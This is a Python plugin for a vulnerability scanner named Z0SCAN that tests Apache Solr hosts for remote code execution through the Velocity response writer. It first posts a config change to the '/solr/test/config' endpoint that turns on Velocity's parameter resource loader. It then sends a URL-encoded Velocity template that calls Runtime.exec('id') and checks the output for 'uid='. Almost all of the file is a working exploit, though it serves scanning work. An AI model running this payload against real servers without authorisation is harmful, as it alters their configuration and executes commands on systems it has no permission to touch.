#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# JiuZero 2025/9/12

import requests
from api import generateResponse, random_num, conf, PLACE, VulType, POST_HINT, Type, _PluginBase, KB

class Z0SCAN(_PluginBase):
    name = "other-solr-rce"
    version = "2025.9.12"
    desc = "Apache Solr RCE via Velocity"
    ports = [8983]
    fingers = []
    
    def audit(self):
        try:
            url = 'http://' + self.host
            payload = '''
                {
                  "update-queryresponsewriter": {
                    "startup": "lazy",
                    "name": "velocity",
                    "class": "solr.VelocityResponseWriter",
                    "template.base.dir": "",
                    "solr.resource.loader.enabled": "true",
                    "params.resource.loader.enabled": "true"
                  }
                }'''
            r = requests.post(url + '/solr/test/config', payload)
            if r.status_code == 200 and 'responseHeader' in r.text:
                _payload = r"/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
                r = requests.get(url + _payload)
                if 'uid=' in r.text:
                    result = self.generate_result()
                    result.main({
                        "type": Type.REQUEST, 
                        "url": url, 
                        "vultype": VulType.OTHER, 
                        })
                    self.success(result)
        except Exception:
            pass
    